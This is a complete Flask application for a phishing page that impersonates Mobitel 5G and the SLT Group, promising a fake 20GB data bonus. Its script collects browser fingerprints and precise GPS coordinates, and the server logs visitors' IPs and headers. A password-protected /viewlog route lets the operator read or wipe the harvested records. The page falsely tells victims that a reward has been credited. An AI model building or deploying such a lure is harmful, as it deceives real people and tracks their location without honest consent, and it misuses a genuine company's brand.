from flask import Flask, request, render_template_string, abort
import datetime
import json

app = Flask(__name__)

LOG_FILE = "visitors.log"
SECRET_PASSWORD = "MySecretViewKey123"  # Change this to a strong secret

# ------------------- HTML TEMPLATE WITH BRANDING & LOCATION GATING -------------------
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Mobitel 5G | Revolution Reward Activation</title>
    <!-- Font Awesome 6 & Google Fonts -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(145deg, #eef2f9 0%, #d9e1ec 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
        }
        .reward-container {
            max-width: 550px;
            width: 100%;
            margin: 20px auto;
            background: #ffffff;
            border-radius: 3rem;
            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.25), 0 2px 8px rgba(0, 0, 0, 0.05);
            overflow: hidden;
            transition: all 0.2s ease;
        }
        .hero-brand {
            background: linear-gradient(135deg, #0B1E33 0%, #002244 100%);
            padding: 1.8rem 1.8rem 1.5rem 1.8rem;
            text-align: center;
            border-bottom-left-radius: 2rem;
            border-bottom-right-radius: 2rem;
            position: relative;
            overflow: hidden;
        }
        .hero-brand::before {
            content: "5G";
            font-size: 6rem;
            font-weight: 800;
            position: absolute;
            bottom: -20px;
            right: -15px;
            opacity: 0.08;
            color: white;
            font-family: monospace;
            pointer-events: none;
        }
        .logo-row {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 1.2rem;
            flex-wrap: wrap;
        }
        .brand-icon {
            background: rgba(255,255,255,0.15);
            width: 52px;
            height: 52px;
            border-radius: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            backdrop-filter: blur(3px);
            color: #FFD966;
        }
        .brand-name {
            font-size: 1.7rem;
            font-weight: 800;
            letter-spacing: -0.5px;
            background: linear-gradient(115deg, #FFFFFF, #E0F2FE);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
            text-shadow: 0 2px 3px rgba(0,0,0,0.1);
        }
        .slt-badge {
            font-size: 0.8rem;
            font-weight: 500;
            background: rgba(255,255,240,0.2);
            display: inline-block;
            padding: 0.2rem 0.8rem;
            border-radius: 40px;
            color: #FFECB3;
            margin-top: 6px;
        }
        .revolution-image {
            background: rgba(255,255,255,0.05);
            border-radius: 32px;
            padding: 1rem 1rem;
            margin: 1rem 0 0.4rem 0;
            border: 1px solid rgba(255,215,0,0.3);
            backdrop-filter: blur(2px);
        }
        .pioneer-text {
            font-weight: 700;
            font-size: 1.3rem;
            line-height: 1.3;
            color: #FFE8B6;
        }
        .pioneer-text small {
            font-size: 0.85rem;
            display: block;
            font-weight: 400;
            color: #CBDAFF;
            margin-top: 6px;
        }
        .revolve-highlight {
            font-size: 1.7rem;
            font-weight: 800;
            background: linear-gradient(125deg, #F5E56B, #FFC857);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
            letter-spacing: -0.3px;
        }
        .content-card {
            padding: 2rem 1.8rem 2rem 1.8rem;
        }
        .bonus-title {
            font-size: 1.6rem;
            font-weight: 700;
            color: #0A2540;
            margin-bottom: 0.5rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .bonus-title i {
            color: #E67E22;
            font-size: 1.8rem;
        }
        .sub {
            color: #5a6874;
            font-size: 0.9rem;
            margin-bottom: 1.5rem;
            border-left: 3px solid #F39C12;
            padding-left: 12px;
        }
        .location-required {
            background: #FEF7E0;
            border-radius: 18px;
            padding: 0.8rem 1rem;
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 1.8rem;
            font-size: 0.85rem;
            font-weight: 500;
            color: #A95F00;
        }
        .location-required i {
            font-size: 1.3rem;
        }
        .btn-activate {
            background: linear-gradient(95deg, #0F2B3D, #1B4F72);
            border: none;
            width: 100%;
            padding: 1rem;
            font-size: 1.2rem;
            font-weight: 700;
            border-radius: 60px;
            color: white;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        .btn-activate:hover:not(:disabled) {
            background: linear-gradient(95deg, #1E4A6E, #0E3A55);
            transform: scale(0.98);
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .btn-activate:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            background: #5c7c8f;
        }
        #status-area {
            margin-top: 1.5rem;
            background: #F8FAFE;
            border-radius: 24px;
            padding: 1rem;
            text-align: center;
            font-size: 0.9rem;
            font-weight: 500;
            border: 1px solid #E2E9F2;
        }
        .success-badge {
            color: #0F5C2F;
            background: #E3F7EC;
            border-radius: 40px;
            padding: 8px 12px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        .error-badge {
            color: #B13E3E;
            background: #FFECEC;
            border-radius: 40px;
            padding: 8px 12px;
        }
        .footer-note {
            font-size: 0.7rem;
            text-align: center;
            color: #8C9AA8;
            margin-top: 1.5rem;
            border-top: 1px solid #EFF2F8;
            padding-top: 1rem;
        }
        .loader {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
<div class="reward-container">
    <!-- Branding & Hero with Logo and Image (Pioneering Sri Lanka's + Revolution) -->
    <div class="hero-brand">
        <div class="logo-row">
            <div class="brand-icon">
                <i class="fas fa-signal"></i>
            </div>
            <div class="brand-name">MOBITEL 5G</div>
            <div class="slt-badge"><i class="fas fa-globe-asia"></i> SLT Group</div>
        </div>
        <div class="revolution-image">
            <div class="pioneer-text">
                <i class="fas fa-tower-cell"></i> PIONEERING SRI LANKA’S<br>
                <small>Experience Reliable 5G. Rapidly Expanding Across The Country.</small>
            </div>
            <div style="margin-top: 10px;">
                <span class="revolve-highlight"><i class="fas fa-bolt"></i> REVOLUTION <i class="fas fa-arrow-right"></i></span>
            </div>
        </div>
        <div style="display: flex; justify-content: center; gap: 8px; margin-top: 10px;">
            <i class="fas fa-microchip" style="color:#FFD966; opacity:0.7;"></i>
            <i class="fas fa-wifi" style="color:#FFD966; opacity:0.7;"></i>
            <i class="fas fa-mobile-alt" style="color:#FFD966; opacity:0.7;"></i>
        </div>
    </div>

    <!-- Reward Activation Content – only after location data is gathered -->
    <div class="content-card">
        <div class="bonus-title">
            <i class="fas fa-gift"></i> 
            <span>20GB Data Bonus</span>
        </div>
        <div class="sub">
            Exclusive 5G welcome reward · Valid for 30 days
        </div>
        <div class="location-required">
            <i class="fas fa-map-marker-alt"></i>
            <span><strong>📍 Location-gated reward:</strong> To unlock your bonus, we need your GPS permission. Your reward will activate <u>only after</u> precise location is shared.</span>
        </div>
        <button id="activateBtn" class="btn-activate">
            <i class="fas fa-shield-alt"></i> Activate Reward
        </button>
        <div id="status-area">
            <i class="fas fa-location-dot"></i> Ready · Location required for activation
        </div>
        <div class="footer-note">
            <i class="fas fa-lock"></i> Secure & private · One-time activation<br>
            By proceeding, location data is used to verify eligibility.
        </div>
    </div>
</div>

<script>
    // ---------- LOCATION GATING: REWARD ACTIVATES ONLY AFTER GPS SUCCESS ----------
    const activateBtn = document.getElementById('activateBtn');
    const statusDiv = document.getElementById('status-area');
    let isActivated = false;
    let locationRequestInProgress = false;

    function updateStatus(message, isError = false, isSuccess = false) {
        if (isSuccess) {
            statusDiv.innerHTML = `<div class="success-badge"><i class="fas fa-check-circle"></i> ${message}</div>`;
        } else if (isError) {
            statusDiv.innerHTML = `<div class="error-badge"><i class="fas fa-exclamation-triangle"></i> ${message}</div>`;
        } else {
            statusDiv.innerHTML = `<i class="fas fa-info-circle"></i> ${message}`;
        }
    }

    async function sendFingerprint() {
        try {
            const fp = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                timestamp: new Date().toISOString()
            };
            await fetch('/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(fp)
            });
        } catch(e) { console.warn("fingerprint log failed", e); }
    }

    async function sendLocationToServer(position) {
        try {
            const coords = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: new Date().toISOString()
            };
            await fetch('/geo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(coords)
            });
        } catch(e) { console.warn("geo log failed", e); }
    }

    function onLocationSuccess(position) {
        if (isActivated) return;
        locationRequestInProgress = false;
        updateStatus("📍 Location captured! Activating your bonus...", false, false);
        sendLocationToServer(position);
        // **** REWARD ACTIVATION ONLY AFTER LOCATION DATA GATHERED ****
        isActivated = true;
        activateBtn.disabled = true;
        activateBtn.innerHTML = '<i class="fas fa-check-circle"></i> Reward Activated!';
        updateStatus("✅ Activation successful! Your 20GB 5G bonus has been credited. Thank you for sharing your location.", false, true);
        const container = document.querySelector('.reward-container');
        container.style.boxShadow = "0 20px 40px -12px rgba(0,128,0,0.2)";
    }

    function onLocationError(error) {
        if (isActivated) return;
        locationRequestInProgress = false;
        let errorMsg = "Location access denied or unavailable. Reward cannot be activated without GPS.";
        if (error.code === error.PERMISSION_DENIED) errorMsg = "❌ Location permission denied. Please allow location and try again.";
        else if (error.code === error.POSITION_UNAVAILABLE) errorMsg = "📍 Position unavailable. Enable GPS and retry.";
        else if (error.code === error.TIMEOUT) errorMsg = "⏱️ Location request timed out. Please try again.";
        updateStatus(errorMsg, true, false);
        activateBtn.disabled = false;
        activateBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Retry Activation';
    }

    function startActivation() {
        if (isActivated) {
            updateStatus("🎉 Reward already activated! You have received your data bonus.", false, true);
            return;
        }
        if (locationRequestInProgress) {
            updateStatus("⏳ Activation in progress, please wait...", false, false);
            return;
        }
        activateBtn.disabled = true;
        activateBtn.innerHTML = '<span class="loader"></span> Requesting location...';
        updateStatus("🌍 Location required to activate reward – please allow GPS access.", false, false);
        sendFingerprint(); // non-blocking logging
        if (!navigator.geolocation) {
            updateStatus("⚠️ Browser does not support geolocation. Reward cannot be activated.", true, false);
            activateBtn.disabled = false;
            activateBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Activate Reward';
            return;
        }
        locationRequestInProgress = true;
        navigator.geolocation.getCurrentPosition(onLocationSuccess, onLocationError, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        });
    }

    activateBtn.addEventListener('click', startActivation);
</script>
</body>
</html>
"""

# ------------------- FLASK BACKEND (LOGGING, VIEWLOG, IP EXTRACTION) -------------------
def get_real_ip():
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr

@app.route('/')
def index():
    # Log basic visit (IP, user-agent, referer)
    log_entry = {
        "ip": get_real_ip(),
        "user_agent_raw": request.headers.get('User-Agent'),
        "referer": request.headers.get('Referer'),
        "accept_language": request.headers.get('Accept-Language'),
        "timestamp": datetime.datetime.utcnow().isoformat(),
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(log_entry) + "\n")
    return render_template_string(HTML_PAGE)

@app.route('/log', methods=['POST'])
def log_fingerprint():
    data = request.get_json()
    entry = {
        "ip": get_real_ip(),
        "fingerprint": data
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    return "ok"

@app.route('/geo', methods=['POST'])
def log_geo():
    data = request.get_json()
    entry = {
        "ip": get_real_ip(),
        "gps": data
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    return "ok"

@app.route('/viewlog')
def view_log():
    password = request.args.get('key', '')
    if password != SECRET_PASSWORD:
        abort(403)
    if request.args.get('clear', '').lower() == 'true':
        try:
            with open(LOG_FILE, "w") as f:
                f.write("")
            return "<pre>✅ Log file cleared.</pre>"
        except Exception as e:
            return f"<pre>❌ Error clearing log: {str(e)}</pre>"
    try:
        with open(LOG_FILE, "r") as f:
            contents = f.read()
    except FileNotFoundError:
        contents = "No visitors yet."
    return f"<pre>{contents}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)